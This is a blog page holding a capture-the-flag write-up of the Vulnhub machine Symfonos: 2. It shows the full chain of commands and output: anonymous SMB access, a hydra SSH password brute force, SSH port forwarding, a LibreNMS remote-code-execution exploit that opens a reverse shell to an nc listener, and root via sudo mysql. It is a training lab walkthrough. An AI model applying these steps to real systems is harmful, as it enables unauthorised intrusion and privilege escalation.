@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html lang="">
+    <head>
+         
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <title>Symfonos: 2 - Writeup</title>
+        <style>
+
+    html body {
+        font-family: '', sans-serif;
+        background-color: white;
+    }
+
+    :root {
+        --accent: green;
+        --border-width:  5px ;
+    }
+
+</style>
+
+
+<link rel="stylesheet" href="https://0x23b.github.io/css/main.css">
+
+
+
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=">
+
+
+
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
+
+
+<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha384-wvfXpqpZZVQGK6TAh5PVlGOfQNHSoD2xbE+QkPxCAFlNEevoEH3Sl0sibVcOQVnN" crossorigin="anonymous">
+ 
+
+
+
+
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+
+
+<script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
+
+
+<script>$(document).on('click', function() { $('.collapse').collapse('hide'); })</script>
+ <meta name="generator" content="Hugo 0.32.4" />
+        
+        
+        
+        
+        <script async src="https://www.googletagmanager.com/gtag/js?id=UA-91628530-1"></script>
+        <script>
+          window.dataLayer = window.dataLayer || [];
+          function gtag(){dataLayer.push(arguments)};
+          gtag('js', new Date());
+
+          gtag('config', 'UA-91628530-1');
+        </script>
+        
+    </head>
+
+    
+    <script type="text/javascript" async
+      src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+  </script>
+
+    <body>
+        
+
+        <nav class="navbar navbar-default navbar-fixed-top">
+
+            <div class="container">
+
+                <div class="navbar-header">
+
+                    <a class="navbar-brand visible-xs" href="#">Symfonos: 2 - Writeup</a>
+					
+                    <button class="navbar-toggle" data-target=".navbar-collapse" data-toggle="collapse">
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                    </button>
+                </div>
+
+                <div class="collapse navbar-collapse">
+
+                    
+                        <ul class="nav navbar-nav">
+                            
+                                <li><a href="https://0x23b.github.io/">Home</a></li>
+                            
+                                <li><a href="https://0x23b.github.io/about">About</a></li>
+                            
+                                <li><a href="https://0x23b.github.io/tags/">Tags</a></li>
+                            
+                                <li><a href="https://0x23b.github.io/posts/">Posts</a></li>
+                            
+                        </ul>
+                    
+
+                    
+                        <ul class="nav navbar-nav navbar-right">
+                            
+                                <li class="navbar-icon"><a href="https://github.com/0x23b/"><i class="fa fa-github"></i></a></li>
+                            
+                                <li class="navbar-icon"><a href="https://twitter.com/0x23b/"><i class="fa fa-twitter"></i></a></li>
+                            
+							<li class="navbar-icon"></li>
+
+                        </ul>
+						
+						<ul class="nav navbar-nav navbar-right">
+                        </ul>
+						
+						
+
+                    
+
+                </div>
+
+            </div>
+
+        </nav>
+
+
+<main>
+
+    <div class="item">
+
+    
+    
+    
+
+    
+    
+
+    <h4><a href="https://0x23b.github.io/posts/vulnhub/2019-08-09-vulnhub_symfonos_2_writeup/">Symfonos: 2 - Writeup</a></h4>
+    <h5>August 9, 2019</h5>
+    
+    <a href="https://0x23b.github.io/tags/vulnhub"><kbd class="item-tag">Vulnhub</kbd></a>
+    
+    <a href="https://0x23b.github.io/tags/writeups"><kbd class="item-tag">Writeups</kbd></a>
+    
+
+</div>
+
+
+    <br> <div class="text-justify">
+
+<h1 id="symfonos-2-writeup">Symfonos: 2 - Writeup</h1>
+
+<h2 id="summary">Summary</h2>
+
+<p>This was an awesome and fun machine - absolutely OSCP like! Like in the 1st version, we have to login anonymously to SMB in order to read a log file, which includes a username. After bruteforcing the password of that user, we can login via ssh. While on the system, we find out, that a webserver is running locally, which we have to access remotely via port forwarding. The web application is vulnerable to RCE which brings us to another user, that is able to run mysql as sudo. That is enough to get root.</p>
+
+<h2 id="identifying-the-host">Identifying the host</h2>
+
+<p>After booting the VM, it directly displays it&rsquo;s IP address, so we don&rsquo;t need any further action here.</p>
+
+<h2 id="port-scan">Port Scan</h2>
+
+<p>As always, full port scan with <code>nmap</code>:</p>
+
+<pre><code>root@kali:/mnt/hgfs/Share/vulnhub/symfonos2# nmap -p- -oA all_tcp_ports 192.168.178.34
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-08-09 05:32 EDT
+Nmap scan report for symfonos2 (192.168.178.34)
+Host is up (0.0023s latency).
+Not shown: 65530 closed ports
+PORT    STATE SERVICE
+21/tcp  open  ftp
+22/tcp  open  ssh
+80/tcp  open  http
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds
+MAC Address: 08:00:27:E4:3E:60 (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 21.02 seconds
+</code></pre>
+
+<p>Several ports are open and it might be, that we are again able to login anonymously to SMB. Let&rsquo;s start with that:</p>
+
+<h2 id="smb">SMB</h2>
+
+<p>As we don&rsquo;t know, which shares we expect with this machine, we first have to list them by using <code>smbclient</code> with the option <code>-L</code>:</p>
+
+<pre><code>root@kali:/mnt/hgfs/Share/vulnhub/symfonos2# smbclient -L //192.168.178.34/
+Enter WORKGROUP\root's password:
+
+    Sharename       Type      Comment
+    ---------       ----      -------
+    print$          Disk      Printer Drivers
+    anonymous       Disk      
+    IPC$            IPC       IPC Service (Samba 4.5.16-Debian)
+Reconnecting with SMB1 for workgroup listing.
+
+    Server               Comment
+    ---------            -------
+
+    Workgroup            Master
+    ---------            -------
+    WORKGROUP            SYMFONOS2
+</code></pre>
+
+<p>We can see, that a share called <code>anonymous</code> is available. After trying to login without providing a password let&rsquo;s us in:</p>
+
+<pre><code>root@kali:/mnt/hgfs/Share/vulnhub/symfonos2# smbclient //192.168.178.34/anonymous
+Enter WORKGROUP\root's password:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        0  Thu Jul 18 10:30:09 2019
+  ..                                  D        0  Thu Jul 18 10:29:08 2019
+  backups                             D        0  Thu Jul 18 10:25:17 2019
+
+        19728000 blocks of size 1024. 16312468 blocks available
+smb: \&gt; cd backups\
+smb: \backups\&gt; dir
+  .                                   D        0  Thu Jul 18 10:25:17 2019
+  ..                                  D        0  Thu Jul 18 10:30:09 2019
+  log.txt                             N    11394  Thu Jul 18 10:25:16 2019
+
+        19728000 blocks of size 1024. 16312468 blocks available
+smb: \backups\&gt; get log.txt
+getting file \backups\log.txt of size 11394 as log.txt (463.6 KiloBytes/sec) (average 463.6 KiloBytes/sec)
+</code></pre>
+
+<p>We found a log file, which we downloaded. After inspecting the file, we can see, that it reveals a username:</p>
+
+<pre><code>root@kali:/mnt/hgfs/Share/vulnhub/symfonos2# cat log.txt
+root@symfonos2:~# cat /etc/shadow &gt; /var/backups/shadow.bak
+root@symfonos2:~# cat /etc/samba/smb.conf
+...
+# Set the user and group under which the server will run.
+User                aeolus
+Group               aeolus
+...
+</code></pre>
+
+<h2 id="ssh-login">SSH login</h2>
+
+<p>As we have a username now, we can try to bruteforce the password with <code>hydra</code> and the wordlist <code>rockyou.txt</code>:</p>
+
+<pre><code>root@kali:/mnt/hgfs/Share/vulnhub/symfonos2# hydra -l aeolus -P /usr/share/wordlists/rockyou.txt ssh://192.168.178.34
+...
+[22][ssh] host: 192.168.178.34   login: aeolus   password: sergioteamo
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-08-09 05:45:21
+</code></pre>
+
+<p>Great! We now have a password, which we can use to login:</p>
+
+<pre><code>root@kali:/mnt/hgfs/Share/vulnhub/symfonos2# ssh aeolus@192.168.178.34
+The authenticity of host '192.168.178.34 (192.168.178.34)' can't be established.
+ECDSA key fingerprint is SHA256:B1Gy++lPIkpytQPksfdhzAydQ8n3Hlor7srtoKol248.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '192.168.178.34' (ECDSA) to the list of known hosts.
+aeolus@192.168.178.34's password:
+Linux symfonos2 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1+deb9u3 (2019-06-16) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Thu Jul 18 08:52:59 2019 from 192.168.201.1
+aeolus@symfonos2:~$ id
+uid=1000(aeolus) gid=1000(aeolus) groups=1000(aeolus),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev)
+</code></pre>
+
+<h2 id="local-port-forwarding-to-8080">Local Port Forwarding to 8080</h2>
+
+<p>While on the system, we can find out with <code>nmap</code>, that the port 8080 is open. After enumerating further, we can see, that it&rsquo;s indeed an <code>apache httpd</code>:</p>
+
+<pre><code>aeolus@symfonos2:~$ nmap -p- localhost
+Starting Nmap 7.40 ( https://nmap.org ) at 2019-08-09 05:47 CDT
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.000038s latency).
+Other addresses for localhost (not scanned): ::1
+Not shown: 65527 closed ports
+PORT     STATE SERVICE
+21/tcp   open  ftp
+22/tcp   open  ssh
+25/tcp   open  smtp
+80/tcp   open  http
+139/tcp  open  netbios-ssn
+445/tcp  open  microsoft-ds
+3306/tcp open  mysql
+8080/tcp open  http-proxy
+
+Nmap done: 1 IP address (1 host up) scanned in 1.43 seconds
+aeolus@symfonos2:~$ nmap -sC -sV -p8080 localhost
+
+Starting Nmap 7.40 ( https://nmap.org ) at 2019-08-09 05:48 CDT
+Nmap scan report for localhost (127.0.0.1)
+Host is up (0.000071s latency).
+Other addresses for localhost (not scanned): ::1
+PORT     STATE SERVICE VERSION
+8080/tcp open  http    Apache httpd 2.4.25 ((Debian))
+| http-open-proxy: Potentially OPEN proxy.
+|_Methods supported:CONNECTION
+| http-robots.txt: 1 disallowed entry
+|_/
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Did not follow redirect to http://localhost/login
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 6.96 seconds
+</code></pre>
+
+<p>As the web server is running locally and we can&rsquo;t use our browser to access it, we have to use local port forwarding with ssh in order to reach it. With the option <code>-L</code> we can specify, which port we want to access on our host, which then will be routed to the remote host:</p>
+
+<pre><code>root@kali:/mnt/hgfs/Share/vulnhub/symfonos2# ssh -L 8080:127.0.0.1:8080 aeolus@192.168.178.34
+aeolus@192.168.178.34's password:
+...
+aeolus@symfonos2:~$
+</code></pre>
+
+<h2 id="port-8080">Port 8080</h2>
+
+<p>After accessing the web server on <code>localhost:8080</code> through our browser, we can see, that <code>librenms</code> is running. Using <code>searchsploit</code> reveals, that this application is vulnerable to remote code execution, which comes really handy! We log in to the web application by providing the same credentials used for ssh. Downloading the exploit, it requires our cookies, listener ip and port to run. We setup our netcat listener and fire up the exploit:</p>
+
+<pre><code>root@kali:/mnt/hgfs/Share/vulnhub/symfonos2# searchsploit librenms
+...
+LibreNMS 1.46 - 'addhost' Remote Code Execution | exploits/php/webapps/47044.py
+...
+root@kali:/mnt/hgfs/Share/vulnhub/symfonos2# searchsploit -m exploits/php/webapps/47044.py
+  Exploit: LibreNMS 1.46 - 'addhost' Remote Code Execution
+      URL: https://www.exploit-db.com/exploits/47044
+     Path: /usr/share/exploitdb/exploits/php/webapps/47044.py
+File Type: Python script, ASCII text executable, with CRLF line terminators
+
+Copied to: /mnt/hgfs/Share/vulnhub/symfonos2/47044.py
+
+root@kali:/mnt/hgfs/Share/vulnhub/symfonos2# python 47044.py http://localhost:8080 &quot;librenms_session=eyJpdiI6InZ1U3U3eTM4NTU2TFdDaTJBdmVjZWc9PSIsInZhbHVlIjoiWjBDVm9CcmlDQVEyUFF0UGpYODBhTE11RDg4TUM2VWtcL2NwMHhVZit3UDlVN0JcLzdHOWFVajZ2TFpcL1l6TCt1NGlwOVhjdVo3cjBPN0w5UHNBM2d0YkE9PSIsIm1hYyI6ImQ0NWE3ZWQ5M2EyNzA1NDZjODg5ZmQzN2JkMDQxNzQ1NWEzNGNjMjY2OWZiN2JkNDBkOGNkM2UyZjEyNjhmODUifQ==; XSRF-TOKEN=eyJpdiI6IjEyZm1ZWlo2dU9MVDJaTmpPZnhYTEE9PSIsInZhbHVlIjoiaG1za3VnZ1JVdk05UFwvUXNTUFF2TUlLVDRpelRmV0prMkU2N3QreWt1NjdaODNjY0pWRUJXTWQ3S3JcL2JtWnYyclpMMWJPY0hOOXY4RW9aaHk4UGU3Zz09IiwibWFjIjoiYjRhNTU0MjYwMzM1OWRjZTQ1MDU1ZGU1NDMwY2E1MDk5N2EzNmYzMTk5NGM5YWY5MTczMzAxMmY3NGQzY2RjNyJ9; PHPSESSID=ern5j06g3mth2e6jn5b1sre5t3&quot; 192.168.178.51 443
+[+] Device Created Sucssfully
+
+... ANOTHER TERMINAL ...
+
+root@kali:/mnt/hgfs/Share/vulnhub/symfonos2# nc -lvnp 443
+listening on [any] 443 ...
+connect to [192.168.178.51] from (UNKNOWN) [192.168.178.34] 42278
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=1001(cronus) gid=1001(cronus) groups=1001(cronus),999(librenms)
+</code></pre>
+
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+
+<p>Using <code>sudo -l</code>, we can see, that we can run <code>mysql</code> with sudo privileges. Glad, that mysql already has a command line options to directly execute shell commands, which gives us root easily:</p>
+
+<pre><code>$ sudo -l
+Matching Defaults entries for cronus on symfonos2:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User cronus may run the following commands on symfonos2:
+    (root) NOPASSWD: /usr/bin/mysql
+$ sudo mysql -e &quot;\! /bin/bash&quot;
+id
+uid=0(root) gid=0(root) groups=0(root)
+cat /root/proof.txt
+
+    Congrats on rooting symfonos:2!
+
+           ,   ,
+         ,-`{-`/
+      ,-~ , \ {-~~-,
+    ,~  ,   ,`,-~~-,`,
+  ,`   ,   { {      } }                                             }/
+ ;     ,--/`\ \    / /                                     }/      /,/
+;  ,-./      \ \  { {  (                                  /,;    ,/ ,/
+; /   `       } } `, `-`-.___                            / `,  ,/  `,/
+ \|         ,`,`    `~.___,---}                         / ,`,,/  ,`,;
+  `        { {                                     __  /  ,`/   ,`,;
+        /   \ \                                 _,`, `{  `,{   `,`;`
+       {     } }       /~\         .-:::-.     (--,   ;\ `,}  `,`;
+       \\._./ /      /` , \      ,:::::::::,     `~;   \},/  `,`;     ,-=-
+        `-..-`      /. `  .\_   ;:::::::::::;  __,{     `/  `,`;     {
+                   / , ~ . ^ `~`\:::::::::::&lt;&lt;~&gt;-,,`,    `-,  ``,_    }
+                /~~ . `  . ~  , .`~~\:::::::;    _-~  ;__,        `,-`
+       /`\    /~,  . ~ , '  `  ,  .` \::::;`   &lt;&lt;&lt;~```   ``-,,__   ;
+      /` .`\ /` .  ^  ,  ~  ,  . ` . ~\~                       \\, `,__
+     / ` , ,`\.  ` ~  ,  ^ ,  `  ~ . . ``~~~`,                   `-`--, \
+    / , ~ . ~ \ , ` .  ^  `  , . ^   .   , ` .`-,___,---,__            ``
+  /` ` . ~ . ` `\ `  ~  ,  .  ,  `  ,  . ~  ^  ,  .  ~  , .`~---,___
+/` . `  ,  . ~ , \  `  ~  ,  .  ^  ,  ~  .  `  ,  ~  .  ^  ,  ~  .  `-,
+
+    Contact me via Twitter @zayotic to give feedback!
+</code></pre>
+</div>
+
+    
+    
+
+    
+
+    
+
+</main>
+
+        <footer>
+
+            <p class="copyright text-muted">&copy; All rights reserved. Powered by <a href="https://gohugo.io">Hugo</a> and <a href="https://github.com/calintat/minimal">Minimal</a></p>
+
+        </footer>
+       
+    </body>
+
+</html>
+
